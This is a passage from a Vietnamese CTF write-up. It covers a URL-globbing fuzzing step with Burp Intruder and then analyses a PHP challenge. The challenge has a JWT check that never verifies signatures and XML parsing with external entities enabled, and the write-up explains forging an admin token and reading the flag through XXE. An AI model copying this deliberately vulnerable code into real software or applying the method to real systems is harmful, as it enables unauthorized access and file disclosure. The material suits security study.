có í tưởng rồi thì triển khai , add to instruder , chọn sniper attack , chọn 1 chữ cái bất kì trong từ `flag` , ở đây mình sẽ chọn chữ a , rồi bấm add , ở mục payload chọn simple list rồi thêm lần lượt Ⓐ , ⒜ , ⓐ , chưa đủ mình thử thêm !a! , @a@ , #a# . %a% , ^a^, &a& , *a* , (a) , {a} , [a] , <a> , "a" , 'a' vào danh sách thay thế rồi start attack

<img width="1846" height="638" alt="image" src="https://github.com/user-attachments/assets/e4fccbde-10cc-4c8c-9786-04d95bd4b68e" />

và kết quả là `{a}` đã dính 

<img width="1876" height="836" alt="image" src="https://github.com/user-attachments/assets/4dca9f71-f600-4b1b-977e-56d61ec185bb" />


`flag : KCSC{Y0u_kn0w_uRl_Globbing}`

# Write up: Ka Cê ét Cê

vào challenge nó thì cho một giao diện như thế này và cho soure code

<img width="1920" height="1018" alt="image" src="https://github.com/user-attachments/assets/3795dc7b-66e8-445c-8888-fa9980a1a18a" />

```python
<?php

class JWT
{
    private static $secret = "REDACTED";

    private static function base64UrlEncode($data)
    {
        return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
    }

    private static function base64UrlDecode($data)
    {
        return base64_decode(strtr($data, '-_', '+/'));
    }

    public static function generateToken($payload, $expiresIn = 3600)
    {
        $header = [
            'typ' => 'JWT',
            'alg' => 'HS256'
        ];

        $payload['iat'] = time();
        $payload['exp'] = time() + $expiresIn;

        $headerEncoded = self::base64UrlEncode(json_encode($header));
        $payloadEncoded = self::base64UrlEncode(json_encode($payload));

        $signature = hash_hmac('sha256', "$headerEncoded.$payloadEncoded", self::$secret, true);
        $signatureEncoded = self::base64UrlEncode($signature);

        return "$headerEncoded.$payloadEncoded.$signatureEncoded";
    }

    public static function validateToken($token)
    {
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            return false;
        }

        list($headerEncoded, $payloadEncoded, $signatureEncoded) = $parts;

        $signature = self::base64UrlDecode($signatureEncoded);
        $expectedSignature = hash_hmac('sha256', "$headerEncoded.$payloadEncoded", self::$secret, true);

        if (!hash_equals($signature, $expectedSignature)) {
            return false;
        }

        $payload = json_decode(self::base64UrlDecode($payloadEncoded), true);

        if (isset($payload['exp']) && $payload['exp'] < time()) {
            return false;
        }

        return true;
    }

    public static function decodeToken($token)
    {
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            return null;
        }

        $payload = json_decode(self::base64UrlDecode($parts[1]), true);
        return $payload;
    }

    public static function refreshToken($token, $expiresIn = 3600)
    {
        if (!self::validateToken($token)) {
            throw new Exception('Invalid token');
        }

        $payload = self::decodeToken($token);
        unset($payload['iat']);
        unset($payload['exp']);

        return self::generateToken($payload, $expiresIn);
    }
}
```
file `jwt.php` 

đầu tiên là hàm generate() , đây là 1 hàm tạo token , chia làm 3 phần 

phần đầu header sẽ luôn luôn có thuộc tính là typ và alg , rồi chuyển thành dạng base64

phần 2 sẽ lấy từ tham số `$payload` , thời gian hiện tại , và thời gian hết hạn = thời gian hiện tại + 3600 , gộp lại thành 1 và chuyển thành chuỗi dạng base64 

phần 3 là phần tạo chữ kí , sử dụng thuật toán băm sha256 + phần header , payload đã encode + cái biến secret được khởi tạo ở đầu , tạo thành 1 chuỗi ngẫu nhiên rồi lại chuyển chuỗi đó thành dạng base64

cuối cùng trả về chuỗi `"$headerEncoded.$payloadEncoded.$signatureEncoded";`

Hàm decodeToken nhận tham số là `$token` , nó kiểm tra xem token này có 3 phần hay không , rồi nó decode đoạn thứ 2 của token ra gán vào biên `$payload` và hàm này trả về biến `$payload`


```python
<?php
require_once __DIR__ . '/JWT.php';

class KCSC
{
    public $members;

    public function __construct($members = __DIR__ . '/../members.xml')
    {
        $this->members = $members;
    }

    public function slogan()
    {
        return 'Make KMA Greater';
    }

    public function info()
    {
        return "https://www.facebook.com/kmasec.club";
    }

    public function isAdmin($token)
    {
        if (!JWT::decodeToken($token)) {
            return false;
        } else {
            $payload = JWT::decodeToken($token);
            if ($payload['role'] !== 'admin') {
                return false;
            }
            return true;
        }
    }

    public function update_members($xml_content)
    {
        libxml_use_internal_errors(true);

        $dom = new DOMDocument();
        $loaded = $dom->loadXML($xml_content, LIBXML_DTDLOAD | LIBXML_NOENT);

        if (!$loaded) {
            $errors = libxml_get_errors();
            libxml_clear_errors();
            return ['success' => false, 'message' => 'Invalid XML format: ' . $errors[0]->message];
        }

        $adminNodes = $dom->getElementsByTagName('admin');

        $admin = $adminNodes->item(0)->nodeValue;

        if (file_put_contents($this->members, $xml_content)) {
            return ['success' => true, 'message' => 'Admin ' . $admin . ' updated members.xml file'];
        } else {
            return ['success' => false, 'message' => 'Failed to write file'];
        }
    }
}
```
file `kcsc.php`

Hàm `isAdmin()` nhận tham số là token , nó gọi hàm decodeToken để kiểm tra cái tham số token truyền vào , và nếu true thì nó sẽ lại kiểm tra tiếp trong cái token đó , phần 2 nó có `role = admin` 

Ở đây chúng ta thấy hàm isAdmin() kiểm tra khá là lỏng lẻo, thứ nhất nó gọi hàm decodeToken kiểm tra nhưng hàm này nó cũng chỉ kiểm tra xem token có 3 phần hay không và phần sau nó chỉ kiểm tra mỗi cái phần thân token có chứa `role = admin` hay không thôi
giả sử mình có 1 token abcd.(đoạn này base64 role : admin).abcd thì isAdmin() nó vẫn cứ trả về true

Hàm `update_members()` nhận tham số là `$xml_content` 
`$loaded = $dom->loadXML($xml_content, LIBXML_DTDLOAD | LIBXML_NOENT);` : ở đây loadXML đã nhận xml_content vào để đọc và phân tích nội dung , sử dụng 2 option là LIBXML_DTDLOAD và LIBXML_NOENT
đại khái 2 option đấy là cho phép nạp các tệp tự định nghĩa bên ngoài và cho phép thay thế các entities trong xml

Tiếp tục biến `$adminNodes` : nhiệm vụ của nó là tìm kiếm và lấy ra những những cái thẻ có dạng <admin>
. ví dụ `<admin>abc</admin>` thì biến `$adminNodes` sẽ lấy nguyên cái cụm đó luôn 

Ở dưới có khai báo thêm biến `$admin` , nó sẽ lấy giá trị nằm ở bên `$adminNodes` tức là sẽ lấy chữ `abc` ra ngoài và gán vào nó 

`file_put_contents()` là hàm mà nhận data và đường dẫn của file mà data cần truyền vào để thay đổi data cũ trong file đấy , ở đây chúng ta có biến `$xml_content`  và cái `$member` được khai báo ở đầu là đường dẫn vào file `member.xml`  , nếu mà truyền thành công thì nó sẽ trả về kết quả có biến `admin` , tức là cái biến nằm trong thẻ `<admin>` ra ngoài 

vậy thì ở đây nếu chúng ta có thể truyền được 1 file dạng <admin>payload đọc flag</admin> vào thì hoàn toàn có thể tìm ra flag . và điều đó là hoàn toàn có thể tại vì nội dung ở trong thẻ admin có được lọc hay gì đâu 

```python
<?php
require_once __DIR__ . '/../utils/JWT.php';

$result = new stdClass;

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(400);
    $result->message = "Only POST!";
} else {
    try {
        $data = json_decode(file_get_contents('php://input'), true);
        $username = $data['username'] ?? NULL;
        $password = $data['password'] ?? NULL;

        if ($username === NULL || $password === NULL) {
            $result->message = 'Please provide your username and password!';
        } else if ($username === 'admin' && $password === getenv('ADMIN_PASSWORD')) {
            $result->message = 'Oh, Welcome admin!';
            $result->token = JWT::generateToken(['username' => 'admin', 'role' => 'admin']);
        } else {
            $result->message = 'Hello, CTFer!';
            $result->token = JWT::generateToken(['username' => $username, 'role' => 'ctfer']);
        }
    } catch (\Throwable $th) {
    }
}

echo json_encode($result);
```
kiểm tra xem username có là admin hay không và password nhập vào có giống với ADMIN_PASSWORD được lưu trong biến môi trường hay không 
nếu đúng thì sẽ lấy username :admin và role:admin truyền vào trong `gernerateToken()` để tạo ra được token vs **role** là **admin**
vì đã biết trong cái đoạn thân nó bao gồm những gì , bao gồm username , role , thời gian , cho nên chúng ta có thể tự tao được 1 token giả  mà không quan trọng chữ kí là gì

```python
<?php
require_once __DIR__ . '/../../utils/JWT.php';
require_once __DIR__ . '/../../utils/KCSC.php';

$result = new stdClass;
$kcsc = new KCSC;

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(400);
    $result->message = 'Only POST request!';
} else {
    $token = $_COOKIE['token'] ?? null;
    if (is_null($token)) {
        http_response_code(401);
        $result->message = 'Please provide cookie token!';
    } else if (!$kcsc->isAdmin($token)) {
        http_response_code(403);
        $result->message = 'You are not admin!';
    } else {
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);

        if (!isset($data['xml_content'])) {
            http_response_code(400);
            $result->message = 'Missing xml_content parameter!';
        } else {
            $xml_content = $data['xml_content'];
            $updateResult = $kcsc->update_members($xml_content);

            if ($updateResult['success']) {
                $result->message = $updateResult['message'];
            } else {
                http_response_code(400);
                $result->message = $updateResult['message'];
                if (isset($updateResult['errors'])) {
                    $result->errors = $updateResult['errors'];
                }
            }
        }
    }
}

echo json_encode($result);
```
file `update.php`
muốn vào được đến đây thì bắt buộc phải là admin và sau khi vào thì nó sẽ chó 










































